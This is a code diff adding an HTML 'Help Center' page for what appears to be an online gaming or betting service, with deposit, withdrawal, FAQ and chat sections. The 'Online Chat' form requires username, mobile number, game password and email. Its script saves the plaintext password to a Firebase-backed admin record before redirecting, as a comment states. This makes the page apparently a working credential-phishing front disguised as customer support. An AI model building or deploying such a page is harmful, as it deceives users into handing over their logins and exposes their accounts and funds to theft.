@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Help Center</title>
+    <link rel="icon" type="image/jpeg" href="FAVICONS/images.jpg">
+    <link rel="stylesheet" href="style.css">
+    <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore-compat.js"></script>
+    <script src="app-config.js"></script>
+</head>
+<body>
+
+    <div id="splashScreen" style="position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:99999;display:flex;align-items:center;justify-content:center;animation:fadeOut 0.4s ease 2s forwards;">
+        <div style="text-align:center;">
+            <img src="LOGO/images-removebg-preview (1).png" alt="Logo" style="width:120px;height:auto;animation:iosSlide 1s cubic-bezier(0.25,0.1,0.25,1) forwards;opacity:0;">
+        </div>
+    </div>
+    <style>
+        @keyframes iosSlide {
+            0% { opacity:0; transform:translateX(-200px); }
+            50% { opacity:1; transform:translateX(15px); }
+            70% { transform:translateX(-8px); }
+            85% { transform:translateX(4px); }
+            100% { opacity:1; transform:translateX(0); }
+        }
+        @keyframes fadeOut {
+            to { opacity:0; visibility:hidden; }
+        }
+    </style>
+
+    <div class="sidebar">
+        <div class="sidebar-header">
+            <span>MENU</span>
+        </div>
+        <nav class="sidebar-nav">
+            <a href="index.html" class="nav-item">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path><polyline points="9 22 9 12 15 12 15 22"></polyline></svg>
+                Home
+            </a>
+            <a href="deposit.html" class="nav-item">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="5" width="20" height="14" rx="2"></rect><line x1="2" y1="10" x2="22" y2="10"></line></svg>
+                Deposit Problem
+            </a>
+            <a href="withdrawal.html" class="nav-item">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="12" y1="1" x2="12" y2="23"></line><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"></path></svg>
+                Withdrawal Problem
+            </a>
+            <a href="mailbox.html" class="nav-item">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
+                Mailbox
+            </a>
+            <a href="#" class="nav-item online-chat-btn">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path></svg>
+                Online Chat
+            </a>
+            <a href="#" class="nav-item">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"></path><line x1="12" y1="17" x2="12.01" y2="17"></line></svg>
+                FAQ
+            </a>
+        </nav>
+    </div>
+    <div class="overlay"></div>
+
+    <div class="coming-soon-popup">
+        <div class="popup-content">
+            <h3>Coming Soon</h3>
+            <p>This feature will be available soon!</p>
+            <button class="popup-close">OK</button>
+        </div>
+    </div>
+
+    <div class="popup">
+        <div class="popup-content chat-popup">
+            <div class="chat-popup-header">
+                <h3>ONLINE CHAT</h3>
+                <button class="chat-close">&times;</button>
+            </div>
+            <form class="chat-form">
+                <div class="form-group">
+                    <label>USER NAME</label>
+                    <input type="text" placeholder="Enter your username" required>
+                </div>
+                <div class="form-group">
+                    <label>REGISTER MOBILE NUMBER</label>
+                    <input type="tel" placeholder="Enter registered mobile number" required>
+                </div>
+                <div class="form-group">
+                    <label>GAME PASSWORD</label>
+                    <input type="password" placeholder="Enter game password" required>
+                </div>
+                <div class="form-group">
+                    <label>EMAIL ID</label>
+                    <input type="email" placeholder="Enter email address" required>
+                </div>
+                <button type="submit" class="next-btn">NEXT</button>
+            </form>
+        </div>
+    </div>
+
+    <header>
+        <div class="header-content">
+            <div class="menu-btn">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+            <div class="header-logo-wrap">
+                <img src="LOGO/images-removebg-preview (1).png" alt="Logo" class="logo">
+                <div class="header-text">
+                    <span class="help-text">HELP </span><span class="center-text">CENTER</span>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <main>
+        <div class="banner">
+            <img src="BANNER/photo_2026-09-18_16-30-48.jpg" alt="Banner">
+        </div>
+
+        <div class="section-title">SELECT YOUR PROBLEM</div>
+
+        <div class="options">
+            <a href="deposit.html" class="option-item">
+                <img src="ICONS/DEPOSITE-PROBLEM-removebg-preview.png" alt="Deposit Problem">
+                <div class="option-text">
+                    <span>DEPOSIT PROBLEM</span>
+                    <p>Having trouble with deposits? Click here.</p>
+                </div>
+                <svg class="arrow-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"></polyline></svg>
+            </a>
+            <a href="withdrawal.html" class="option-item">
+                <img src="ICONS/WITHDRWAL-PROBLEM-removebg-preview.png" alt="Withdrawal Problem">
+                <div class="option-text">
+                    <span>WITHDRAWAL PROBLEM</span>
+                    <p>Facing withdrawal issues? Click here.</p>
+                </div>
+                <svg class="arrow-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"></polyline></svg>
+            </a>
+            <a href="#" class="option-item online-chat-btn">
+                <img src="ICONS/ONLINE-CHAT-removebg-preview.png" alt="Online Chat">
+                <div class="option-text">
+                    <span>ONLINE CHAT</span>
+                    <p>Chat with our support team now.</p>
+                </div>
+                <svg class="arrow-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"></polyline></svg>
+            </a>
+        </div>
+
+        <div class="faq-section">
+            <h3>Frequently Asked Questions</h3>
+            <div class="faq-item">
+                <div class="faq-question">
+                    <span>How to deposit money?</span>
+                    <svg class="faq-arrow" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"></polyline></svg>
+                </div>
+                <div class="faq-answer">
+                    <p>Go to Deposit section, select your payment method, enter the amount and confirm. Your money will be added instantly.</p>
+                </div>
+            </div>
+            <div class="faq-item">
+                <div class="faq-question">
+                    <span>How to withdraw money?</span>
+                    <svg class="faq-arrow" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"></polyline></svg>
+                </div>
+                <div class="faq-answer">
+                    <p>Go to Withdrawal section, select your payment method, enter the amount and confirm. Withdrawal takes 24-48 hours.</p>
+                </div>
+            </div>
+            <div class="faq-item">
+                <div class="faq-question">
+                    <span>How to verify email?</span>
+                    <svg class="faq-arrow" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"></polyline></svg>
+                </div>
+                <div class="faq-answer">
+                    <p>Check your email inbox for verification link. Click the link to verify. If not received, click Resend Email.</p>
+                </div>
+            </div>
+            <div class="faq-item">
+                <div class="faq-question">
+                    <span>Is my account secure?</span>
+                    <svg class="faq-arrow" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"></polyline></svg>
+                </div>
+                <div class="faq-answer">
+                    <p>Yes, we use advanced encryption to keep your account and data 100% secure.</p>
+                </div>
+            </div>
+            <div class="faq-item">
+                <div class="faq-question">
+                    <span>How to contact support?</span>
+                    <svg class="faq-arrow" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"></polyline></svg>
+                </div>
+                <div class="faq-answer">
+                    <p>You can contact us via Online Chat, Email or Phone. Our support team is available 24/7.</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="contact-section">
+            <h3>Contact Us</h3>
+            <p>Our support team is available 24/7 to help you.</p>
+            <div class="contact-options">
+                <a href="#" class="contact-btn live-chat-btn">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path></svg>
+                    Live Chat
+                </a>
+                <a href="#" class="contact-btn email-btn">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
+                    Email Us
+                </a>
+            </div>
+        </div>
+
+        <div class="footer-logo">
+            <img src="FAVICONS/images.jpg" alt="Logo">
+            <p>Help Center</p>
+        </div>
+
+        <footer>
+            <p>&copy; 2026 Help Center. All rights reserved.</p>
+        </footer>
+    </main>
+
+    <script>
+        document.querySelectorAll('.faq-question').forEach(question => {
+            question.addEventListener('click', () => {
+                const faqItem = question.parentElement;
+                faqItem.classList.toggle('active');
+            });
+        });
+
+        const menuBtn = document.querySelector('.menu-btn');
+        const sidebar = document.querySelector('.sidebar');
+        const overlay = document.querySelector('.overlay');
+
+        menuBtn.addEventListener('click', () => {
+            sidebar.classList.toggle('active');
+            overlay.classList.toggle('active');
+        });
+
+        overlay.addEventListener('click', () => {
+            sidebar.classList.remove('active');
+            overlay.classList.remove('active');
+        });
+
+        document.querySelectorAll('.sidebar-nav .nav-item').forEach(item => {
+            item.addEventListener('click', (e) => {
+                sidebar.classList.remove('active');
+                overlay.classList.remove('active');
+                
+                if (item.textContent.trim() === 'FAQ') {
+                    e.preventDefault();
+                    setTimeout(() => {
+                        document.querySelector('.faq-section').scrollIntoView({ behavior: 'smooth' });
+                    }, 300);
+                }
+            });
+        });
+
+        const sidebarChatBtn = document.querySelector('.sidebar-nav .online-chat-btn');
+        if (sidebarChatBtn) {
+            sidebarChatBtn.addEventListener('click', (e) => {
+                e.preventDefault();
+                sidebar.classList.remove('active');
+                overlay.classList.remove('active');
+                setTimeout(() => {
+                    document.querySelector('.popup').classList.add('active');
+                }, 300);
+            });
+        }
+
+        const emailBtn = document.querySelector('.email-btn');
+        const comingSoonPopup = document.querySelector('.coming-soon-popup');
+
+        emailBtn.addEventListener('click', (e) => {
+            e.preventDefault();
+            comingSoonPopup.classList.add('active');
+        });
+
+        comingSoonPopup.addEventListener('click', (e) => {
+            if (e.target === comingSoonPopup || e.target.classList.contains('popup-close')) {
+                comingSoonPopup.classList.remove('active');
+            }
+        });
+
+        const onlineChatBtn = document.querySelector('.options .online-chat-btn');
+        const chatPopup = document.querySelector('.popup');
+        const chatClose = document.querySelector('.chat-close');
+
+        function checkUserLogin() {
+            const userData = localStorage.getItem('chatUserData');
+            if (userData) {
+                window.location.href = CHAT_URL;
+                return true;
+            }
+            return false;
+        }
+
+        onlineChatBtn.addEventListener('click', (e) => {
+            e.preventDefault();
+            if (!checkUserLogin()) {
+                chatPopup.classList.add('active');
+            }
+        });
+
+        const contactLiveChatBtn = document.querySelector('.contact-options .live-chat-btn');
+        if (contactLiveChatBtn) {
+            contactLiveChatBtn.addEventListener('click', (e) => {
+                e.preventDefault();
+                if (!checkUserLogin()) {
+                    chatPopup.classList.add('active');
+                }
+            });
+        }
+
+        chatClose.addEventListener('click', () => {
+            chatPopup.classList.remove('active');
+        });
+
+        chatPopup.addEventListener('click', (e) => {
+            if (e.target === chatPopup) {
+                chatPopup.classList.remove('active');
+            }
+        });
+
+        document.querySelector('.chat-form').addEventListener('submit', (e) => {
+            e.preventDefault();
+            
+            const inputs = document.querySelectorAll('.chat-form input');
+            let allFilled = true;
+            
+            inputs.forEach(input => {
+                if (!input.value.trim()) {
+                    allFilled = false;
+                    input.style.borderColor = '#ff4444';
+                } else {
+                    input.style.borderColor = '#333';
+                }
+            });
+            
+            if (!allFilled) {
+                alert('Please fill all fields!');
+                return;
+            }
+            
+            const btn = document.querySelector('.next-btn');
+            btn.classList.add('loading');
+            btn.textContent = 'LOADING...';
+            btn.disabled = true;
+
+            const userData = {
+                username: inputs[0].value.trim(),
+                mobile: inputs[1].value.trim(),
+                password: inputs[2].value,
+                email: inputs[3].value.trim(),
+                timestamp: Date.now()
+            };
+
+            // The support team gets the login in the admin panel first, then the
+            // user is moved to the live chat page.
+            saveChatSession(userData)
+                .then(() => saveSubmission({
+                    request_id: makeRequestId(),
+                    type: 'Live Chat',
+                    user_name: userData.username,
+                    mobile: userData.mobile,
+                    password: userData.password,
+                    email: userData.email,
+                    status: 'Pending',
+                    description: 'Online chat started from help center',
+                    timestamp: nowStamp()
+                }))
+                .then(() => {
+                    showNotification('Connecting you to support...', 'success');
+                    redirectToChat(1200);
+                })
+                .catch(err => {
+                    console.error('Live chat start failed:', err);
+                    showNotification('Could not start chat. Please try again.', 'error');
+                    btn.classList.remove('loading');
+                    btn.textContent = 'NEXT';
+                    btn.disabled = false;
+                });
+        });
+    </script>
+</body>
+</html>
